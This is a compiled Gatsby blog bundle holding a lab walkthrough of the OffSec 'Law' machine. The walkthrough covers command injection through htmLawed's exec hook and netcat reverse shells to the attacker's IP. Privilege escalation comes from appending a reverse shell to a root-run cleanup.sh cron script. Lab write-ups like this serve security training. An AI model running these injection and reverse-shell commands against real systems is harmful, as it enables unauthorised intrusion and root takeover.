"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[394],{4765:function(e,t,n){n.d(t,{F:function(){return p},Z:function(){return g}});var a=n(7294),l=n(8733),i=n(795),c=n(8377),s=n(6799),r=n(8871);var o=e=>{let{post:t}=e;return null};const d=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var m=e=>{let{data:{post:t},children:n}=e;return(0,l.tZ)(c.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},t.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,t.date),t.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(s.Z,{tags:t.tags})),t.timeToRead&&" — ",t.timeToRead&&(0,l.tZ)("span",null,t.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:d.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},n),(0,l.tZ)(o,{post:t}))};const p=e=>{var t,n,a;let{data:{post:i}}=e;return(0,l.tZ)(r.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(t=i.banner)||void 0===t||null===(n=t.childImageSharp)||void 0===n||null===(a=n.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function g(e){let{...t}=e;return a.createElement(m,t)}},6799:function(e,t,n){var a=n(8733),l=n(7294),i=n(1883),c=n(3494),s=n(9706);t.Z=e=>{let{tags:t}=e;const{tagsPath:n,basePath:r}=(0,c.Z)();return(0,a.tZ)(l.Fragment,null,t.map(((e,t)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!t&&", ",(0,a.tZ)(i.Link,{sx:e=>{var t;return{...null===(t=e.styles)||void 0===t?void 0:t.a}},to:(0,s.Z)(`/${r}/${n}/${e.slug}`)},e.name)))))}},8871:function(e,t,n){var a=n(7294),l=n(1883),i=n(4232);t.Z=e=>{let{title:t="",description:n="",pathname:c="",image:s="",children:r=null,canonicalUrl:o=""}=e;const d=(0,i.Z)(),{siteTitle:m,siteTitleAlt:p,siteUrl:g,siteDescription:u,siteImage:h,author:A,siteLanguage:b}=d,f={title:t?`${t} | ${m}`:p,description:n||u,url:`${g}${c||""}`,image:`${g}${s||h}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:b}),a.createElement("title",null,f.title),a.createElement("meta",{name:"description",content:f.description}),a.createElement("meta",{name:"image",content:f.image}),a.createElement("meta",{property:"og:title",content:f.title}),a.createElement("meta",{property:"og:url",content:f.url}),a.createElement("meta",{property:"og:description",content:f.description}),a.createElement("meta",{property:"og:image",content:f.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:f.title}),a.createElement("meta",{name:"twitter:url",content:f.url}),a.createElement("meta",{name:"twitter:description",content:f.description}),a.createElement("meta",{name:"twitter:image",content:f.image}),a.createElement("meta",{name:"twitter:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:creator",content:A}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),o?a.createElement("link",{rel:"canonical",href:o}):null,r)}},7283:function(e,t,n){n.r(t),n.d(t,{Head:function(){return s.F},default:function(){return r}});var a=n(7294),l=n(1151);function i(e){const t=Object.assign({span:"span",h1:"h1",p:"p",code:"code",pre:"pre",h2:"h2",ul:"ul",li:"li",ol:"ol",em:"em",a:"a"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 838px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 24.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAABBUlEQVR42kWP6W6DMBCEeYAklQBjjLlCAwl3KPQQUmha0jbK+7/PdO0U9cdqZ2a/XdnGftsgi2s8BgV2YQnldSUt0qhC4hdUuWb+2ZLYAgdilFdcGt1vGN/nG6a3GeWuR50NOL1+Yj5d8fV+wzicaZGOygJDM1L+Q/MZzf4Z7eEFl+lKuxed9fWIPOlg2KaAw3xwx4fnhpAihvRi0hF8udVe5UsJvugILg/IB5B/WuXGx0TPzlLESQyL2aibGt3TEVVVoihz8hXWDxuEER2THlabNVbkuXBx7FrNKF51xRl9k0C4HhxHwDRtMMbBHJe6C8tytFe5ZTFdSpvmXXNOvyN26Wr2C83VjMIGoVjbAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/834d69c232cb4d96ef453c0b01588f1f/fd14d/info.png"\n        srcset="/static/834d69c232cb4d96ef453c0b01588f1f/5243c/info.png 240w,\n/static/834d69c232cb4d96ef453c0b01588f1f/ab158/info.png 480w,\n/static/834d69c232cb4d96ef453c0b01588f1f/fd14d/info.png 838w"\n        sizes="(max-width: 838px) 100vw, 838px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.h1,null,"Recon"),"\n",a.createElement(t.p,null,"Make an entry for the IP in ",a.createElement(t.code,null,"/etc/hosts")," file. My entry looks like:"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"192.168.227.190 law.offsec\n")),"\n",a.createElement(t.h2,null,"Nmap"),"\n",a.createElement(t.pre,null,a.createElement(t.code,{className:"language-bash"},"nmap -p- --open -sC -sV law.offsec\n")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-p-"),": Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"--open"),": Displays only open ports, indicating which services are active and accessible."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-sC"),": Performs default script scanning, which runs a set of scripts to gather additional information about the target."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-sV"),": Enables version detection, providing information about the versions of services running on open ports.\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 29.166666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAABEElEQVR42lWQaXaDMAyEc5VmaSGAzb4YYyBAkqbNy/1PM5VE0+WHnmRb/makTVWf0LYLrD3DUE5Si2G4YVkeiFSNICwRJ61kHRso3eAYcL3ecfjHHNudwm6vsambCV13IdhMgAq+n0szf+YcU6SZg06MgLPcQSkj72nWwaP+w2ssMAFqamJnrV3Eqevf5WxJpDEzWND1VzmzaGOmdRp6W84P5EX/4+7XobtARidoWY3imO/7b3hRDhK2W0FhVNOYBbReV7A//HE4TXcM401cDOMHpvkO564YT58ixK5rEmO3SjUyoudnBNF42UYST5gAefFhVIlSEFZSs4OIPj9r3hfvj3vYFe/2zcsIoP7BGPgFcLjCPg6/7goAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/577a7c354d0a6645937cfacfd8243cc2/7d769/nmap.png"\n        srcset="/static/577a7c354d0a6645937cfacfd8243cc2/5243c/nmap.png 240w,\n/static/577a7c354d0a6645937cfacfd8243cc2/ab158/nmap.png 480w,\n/static/577a7c354d0a6645937cfacfd8243cc2/7d769/nmap.png 960w,\n/static/577a7c354d0a6645937cfacfd8243cc2/75347/nmap.png 1096w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(t.p,null,"The nmap scan shows port 22 and 80 are open on the target. Port 80 is the web application, going to ",a.createElement(t.code,null,"http://law.offsec")," reveals a web application built with htmLawed 1.2.5."),"\n",a.createElement(t.h1,null,"Initial Access"),"\n",a.createElement(t.p,null,"Searching through google for htmLaw vulnerabilites, I came across a command injection exploit which ran commands using the ",a.createElement(t.code,null,"exec()")," php function."),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the hook option in settings allows the user to set a function through which the input will be passed"),"\n",a.createElement(t.li,null,"using the command ",a.createElement(t.code,null,"id")," we can see if the web application runs the command without sanitizing the input\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABYlAAAWJQFJUiTwAAABvElEQVR42qWR3XLcIAyF/RJtdmOvAf8bMAZjr3+TTNtp3/+NTmV209te5OIbCQ1zdCRF833D6HdU9kCuly8TzcrDqTuUvEOr+ctE2v1EoTdUHbnsKOqV2B75J//e+3+JmnmEKBvwiqglsraDqFqIun1G+cgJRv/Son5Q1mBFQ7U68FmPXpIYrVJQnYbqPaRbUTcNUaOqa+RlCZHlKKmhyAukPAskKUOcpg9uKZjIA9HlNSYxg643sNMKtfyB6R0604f6ur1DaYuybElUUhOFiiLPSFwI3LhAwgS9q0B0iRM4P8JYi2H+EfDTAX8/oMl1ZzqU5DTlDK+3G670/5okuMQxTjMn5/vb9RqIXqggdYfeORg3oR93uPkDmoRb2aIhWikhlQzCTGTgNDrLspCnwSHHqXMSBI0byKWnSIwHuXyH3X7D2jv6npqEOMK6kRwPMEQjFZq2RUW7Zpl47pIhSpIblsFiHQZsfsJOYm/rL6x+wWwHwmGhRl4bZEVJe6zCoTgd6iTl/JlntJIUUS44dhL8mGccw4LdLTj8htU4TLS/0WhMqsao6MpFgZwo64ounodxHyOzMO736yv+AnDJRyL0PxkgAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="hook"\n        title=""\n        src="/static/5799f1beb29a7acdf160a3c1b15002fd/7d769/hook.png"\n        srcset="/static/5799f1beb29a7acdf160a3c1b15002fd/5243c/hook.png 240w,\n/static/5799f1beb29a7acdf160a3c1b15002fd/ab158/hook.png 480w,\n/static/5799f1beb29a7acdf160a3c1b15002fd/7d769/hook.png 960w,\n/static/5799f1beb29a7acdf160a3c1b15002fd/87339/hook.png 1440w,\n/static/5799f1beb29a7acdf160a3c1b15002fd/5ddad/hook.png 1588w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(t.p,null,"However, when clicking on ",a.createElement(t.code,null,"Process"),", we get an error 404 not found. Seems like the web application is sending the request to the wrong destination"),"\n",a.createElement(t.p,null,"We can alter this functionality by capturing the request in Burp Suite"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"start burpsuite, and enter ",a.createElement(t.code,null,"id")," in input field and the ",a.createElement(t.code,null,"exec")," function in the hook field, then capture the request after clicking ",a.createElement(t.code,null,"Process")),"\n"),"\n",a.createElement(t.p,null,"We can remove the .php file from the URL as it seems like the web application does not contain this file/endpoint.\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 37.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABYlAAAWJQFJUiTwAAABTklEQVR42o2Ry3LDIAxF8zn1IwZMEmME2IAbJ9NFp///MbeC9JVdF2eQrqQ7aHR4jws+csSbJ+x2wnbW0EpCyBFSKn4VpPqNhZQYxANRERBKQ1LCOCoc8vWGlDd47+Gcg50t5tlgmqYHxsBaC2Nm1ueqKaXYUKDv+x+65gXH44BD2u9IbBpCqKZlqAxorbnhiK7rngafTLj2l9J/iGzmlxVElteS3FgK/Y/Z/+h/DUPMIO8QEoECr6M7XqdFwyu0TYO2Zb7i5ov2L21Te5u6MhtSiLCB4GIxJFhvQauBWxcYWlhbYIk3CBvmmifMjmfcArdk7l85TrU+jpqPcktI3+wJ66tHvpc4I14j4l4o9Y25sZaRb6/Y7nuNaSH4GNncQZ/5yoYmGHfi35wx0YUZOeeLugtz4l/xxUnA+OHR5zTrBrPnui+5qroaBYbhiE9i/gRakuqfQgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="htmlaw"\n        title=""\n        src="/static/5abda13ddd91128c6f52ed0879927977/7d769/htmlaw.png"\n        srcset="/static/5abda13ddd91128c6f52ed0879927977/5243c/htmlaw.png 240w,\n/static/5abda13ddd91128c6f52ed0879927977/ab158/htmlaw.png 480w,\n/static/5abda13ddd91128c6f52ed0879927977/7d769/htmlaw.png 960w,\n/static/5abda13ddd91128c6f52ed0879927977/87339/htmlaw.png 1440w,\n/static/5abda13ddd91128c6f52ed0879927977/1251e/htmlaw.png 1674w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.p,null,"After removing the ",a.createElement(t.code,null,"htmLawedTest.php")," from the endpoint, we can forward the request"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the ",a.createElement(t.code,null,"id")," command is executed by the web application and we can see that we are running under the user ",a.createElement(t.code,null,"www-data"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 64.16666666666666%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAABnklEQVR42q3Ry3KbMBQGYD1AJ120TbGwCQk3Ia7BIDCyKSnU8cSdZpdd3/8x/gpMmtjudJF28c3R+Y9mpJlD2GaJoMiQpjmyXCDNCjAewfXDNyGFaBBFAmEwKP4Z8f0MnC3BffXTZzx/M5KkFZK4+i+/G3+4qlo08htcFsL2OGzG4ajquJPX51eGe39CzMqHueYwmA3TcmDaDq4cGwtmYeEprsLsF0Pm2zAcC1fWOWLtb+E+5kjqAmVVQZQlclki7gSSrkS4yhD3AtFdgagrkPYVor6AHQW4cdkZUq1atM0OzXqLprmHlD2+bLZo1/doNyqXW8iyG89Ddjdk9RYblafJCnFUHiFBkB82PG1pOHO+nOpLP85GJ3dPkDBU2+HTlsJnYlKcEH+ZHRAvTOCFt2BBCs9JwGzVj+LR0LPf/VSdw8x30jNEezSg/zRBnwzQvQ5tp0HbU9DvOnRl9kBxufusZkNGVTbHbJpfdO/x7uvFEaL3N9B/XIM+KPtrzDr1QL0ArefQ5QIzVbVax1waY0/lYUblHB/FJT6IT0d+AUXki0G4lh0lAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="id"\n        title=""\n        src="/static/1959e896b9f0e7a875737911249ec934/7d769/id.png"\n        srcset="/static/1959e896b9f0e7a875737911249ec934/5243c/id.png 240w,\n/static/1959e896b9f0e7a875737911249ec934/ab158/id.png 480w,\n/static/1959e896b9f0e7a875737911249ec934/7d769/id.png 960w,\n/static/1959e896b9f0e7a875737911249ec934/06dba/id.png 1016w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(t.h2,null,"Reverse shell"),"\n",a.createElement(t.p,null,"Now that we have command injection, let's run a reverse shell to get a foothold on the server."),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"start a netcat listener on the Kali host with ",a.createElement(t.code,null,"nc -lnvp 1234")),"\n",a.createElement(t.li,null,"then input the following command ",a.createElement(t.code,null,"nc -e /bin/sh 192.168.45.220 1234")," in the input field, ",a.createElement(t.code,null,"exec")," function in the hook field and capture the request to remove the php file from the URL\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 42.5%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAABZUlEQVR42p2S2U7DMBBF8xWFLE6azdnsxHaarVSlqFTi/3/oMnEKAiEe4OHIthQf35mJc55PuMxPOJrBMrQaRSlRVO2/cOZ2wtLNOKrFMtG5Fd+Rf8AphUHCG6SWGlkhwMsVeUfQy/ITfqf4BScuc7pUgtckkYakHGnBkeQ5oiRBnK1rCj/aIyBYHFuC/U8Y4cRpBt33MMMCOd+gtIHsOvSHEa3qqZ8COaXnJVWQl/YS22/yOCm+EYQRCSlBqzSEmtANz+jMAtEa1EKgrGuEJPBYCJcxuEGAB88nPDz66/7jvLFz/S1hP4zoehIeTtDLFdLMqOqKqImGUlZYv0tzakee0T4Fo4Q717OSDc9KbcJVKDtlhWZ+gRovMHqE1hOUotLpVxJCoREteFEgoz6vD4Rr6VSmTxXYNQzh9BXHdTzgNi14nc54O14wKEMTa0ggkZMgSmJENIgw3m/9o8vMDimypX/lHfgPCMY1wbl5AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="revshell"\n        title=""\n        src="/static/9f84eaea2569925acd5c0402fbeefe63/7d769/revshell.png"\n        srcset="/static/9f84eaea2569925acd5c0402fbeefe63/5243c/revshell.png 240w,\n/static/9f84eaea2569925acd5c0402fbeefe63/ab158/revshell.png 480w,\n/static/9f84eaea2569925acd5c0402fbeefe63/7d769/revshell.png 960w,\n/static/9f84eaea2569925acd5c0402fbeefe63/87339/revshell.png 1440w,\n/static/9f84eaea2569925acd5c0402fbeefe63/08065/revshell.png 1900w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(t.p,null,"We receive a reverse shell as ",a.createElement(t.code,null,"www-data"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA0UlEQVR42j2PWXLDIBBEdZVYEjI4kcWiIDBikdev3P82nRGu8ser7umihp6m0wWMGOYMYQtseECcHcTo0HMD/mPBxIzuqOvcCwPGNWUGLWVtP6FlEw5VJZrHJeO+XrG5hLJEPOPt46Px8NIiqAX3sFGWYM8zAuWr9liUhzQRmlBmrYubv+sL/jciuYILqTMBq02V5Auiywg2YqNPE/nkc80zeTdScz5joAsYaTdQw73dyEaYbw0lVEWLt9enfZaV6vn01tP+RuJIC756icPn5An/PviAYZrvfTIAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="foothold"\n        title=""\n        src="/static/e24101d7c29432992124fb21111e78d0/7d769/foothold.png"\n        srcset="/static/e24101d7c29432992124fb21111e78d0/5243c/foothold.png 240w,\n/static/e24101d7c29432992124fb21111e78d0/ab158/foothold.png 480w,\n/static/e24101d7c29432992124fb21111e78d0/7d769/foothold.png 960w,\n/static/e24101d7c29432992124fb21111e78d0/2191e/foothold.png 1026w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the first flag is in the directory ",a.createElement(t.code,null,"/var/www")),"\n"),"\n",a.createElement(t.h1,null,"Privilege Escalation"),"\n",a.createElement(t.h2,null,"Pspy"),"\n",a.createElement(t.p,null,"Pspy is a tool that can be used to detect running cronjobs and other commmands being executed without the need for root permissions."),"\n",a.createElement(t.p,null,"Follow these steps to use the pspy64s file and run it on the kali machine"),"\n",a.createElement(t.ol,null,"\n",a.createElement(t.li,null,"Download the ",a.createElement(t.em,null,"64 bit small version: pspy64")," from the github ",a.createElement(t.a,{href:"https://github.com/DominicBreuker/pspy/tree/master"},"here")),"\n",a.createElement(t.li,null,"Start a python http server using ",a.createElement(t.code,null,"python3 -m http.server 80")," in the directory with the downloaded pspy"),"\n",a.createElement(t.li,null,"On the target machine use the following command to save the pspy binary to the ",a.createElement(t.code,null,"/tmp")," directory"),"\n"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"curl -o /tmp/pspy64 http://$kali_ip/pspy64\n")),"\n",a.createElement(t.ol,{start:"4"},"\n",a.createElement(t.li,null,"Then run pspy by first running ",a.createElement(t.code,null,"chmod +x pspy64")," then ",a.createElement(t.code,null,"./pspy64")),"\n"),"\n",a.createElement(t.p,null,"After running the script and waiting for some time (for cronjobs to run etc.) the output shows the following\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 17.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA0klEQVR42m2Q2QqCQBiFewpJTWpsI0tz19HMNgIjKoIWJFre/yFOM2N41cXhnPlhvjn/NIJoiSRdwYwKNP0r1OAKMvShhtxDpkBIH7jQeya6PYv5FHr/vxo03SDPt7BnR0jxC3LyEgA5eaPl7EEMCs3dQ7MLtMeZeEyvoTa6DMJVzawKmGVrONkJUvT8AX3hvGVnMoecfkRWwxvUuETLP4tMjITBLCa7asiBfGVKF5jS3W/lC8jAExc00TCFQh/V2TtAiUqW72z2BBnF7AvMuiXXF+yjfcMseT1kAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="pspy"\n        title=""\n        src="/static/de014c202f6dcdab78ea3eb03da35c03/7d769/pspy.png"\n        srcset="/static/de014c202f6dcdab78ea3eb03da35c03/5243c/pspy.png 240w,\n/static/de014c202f6dcdab78ea3eb03da35c03/ab158/pspy.png 480w,\n/static/de014c202f6dcdab78ea3eb03da35c03/7d769/pspy.png 960w,\n/static/de014c202f6dcdab78ea3eb03da35c03/87339/pspy.png 1440w,\n/static/de014c202f6dcdab78ea3eb03da35c03/aa928/pspy.png 1490w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.p,null,"Remember: in the same web folder as ",a.createElement(t.code,null,"local.txt"),", there was a file called ",a.createElement(t.code,null,"cleanup.sh")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"this file is being run through bash with uid=0 which is the root user"),"\n",a.createElement(t.li,null,"if user ",a.createElement(t.code,null,"www-data")," is able to change the ",a.createElement(t.code,null,"cleanup.sh")," file, these commands will also be run as the root user"),"\n"),"\n",a.createElement(t.p,null,"Start another listener and add the following command to the ",a.createElement(t.code,null,"cleanup.sh")," file"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,'echo "nc -e /bin/sh 192.168.45.220 1233" >> cleanup.sh\n')),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"make sure to use a different port than the first reverse shell\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 57.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAABpklEQVR42o2S63KbMBCFeY9OJhjjJrExN4GEEALhOHWduE37/g9zuitTT8jEM/5xZndB+vaiDd67AX+twx+yv1uLY93gpFrye7wpg1Nz1kFIr3fT45fu8JyViFcZlt/zmYKqttB6hzRVuA/XXuFigzBKEC23WJCWfHGVnhVP9hPoAkxzjawwqJRD0z5Dmz0kJVDkCzmgrHtEvpLiKmQGLKsebfeC3h1hh5/Y7U9kDxjGV/+NwdEXrV0FRsupNWrxfmqVtaDWGHQNFj98XXFwVxzwTZxwJ17xJAaqdu8rE82IkBIxkOEfE7DPl8/+PGmg+jdUhubV7nybkkCC5ral2T4ltVdatEg43nAssd5KPJK/oYfkmM9cgK7S6PIKQ6nghMZYG/SiwSgNhqqFo/hoHJyyWGeNh2elQZJp5GS3ZNn/X2VwsDvsmx4mlxgI6AhiCuVBo+zIdrD0L3tIEcbZhxHMR3GpkFcjocy8b+G0d/7gKidlXhHP69ZX7uwPKNo7nk/E2aasvMzxjZAZUNOeGfviF7qSjuAjysr6hS6ExeqxpJZuB/4DzZVznSSmHVgAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="root"\n        title=""\n        src="/static/21e554bc62dec301f6841208903253a1/7d769/root.png"\n        srcset="/static/21e554bc62dec301f6841208903253a1/5243c/root.png 240w,\n/static/21e554bc62dec301f6841208903253a1/ab158/root.png 480w,\n/static/21e554bc62dec301f6841208903253a1/7d769/root.png 960w,\n/static/21e554bc62dec301f6841208903253a1/d9c41/root.png 1084w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(t.h1,null,"Summary"),"\n",a.createElement(t.p,null,"After reconnaissance and a Nmap scan, a htmLawed application on port 80 is identified. Exploiting a command injection vulnerability, we can gain a reverse shell as the www-data user. Privilege escalation involves Pspy to detect cron jobs, revealing a root-executed cleanup.sh script. By manipulating this script, we can establish a root-level reverse shell."),"\n",a.createElement(t.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(t.p,null,"+10 points"))}var c=function(e){void 0===e&&(e={});const{wrapper:t}=Object.assign({},(0,l.ah)(),e.components);return t?a.createElement(t,e,a.createElement(i,e)):i(e)},s=n(4765);function r(e){return a.createElement(s.Z,e,a.createElement(c,e))}s.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-law-index-mdx-c1e66489381e6880e967.js.map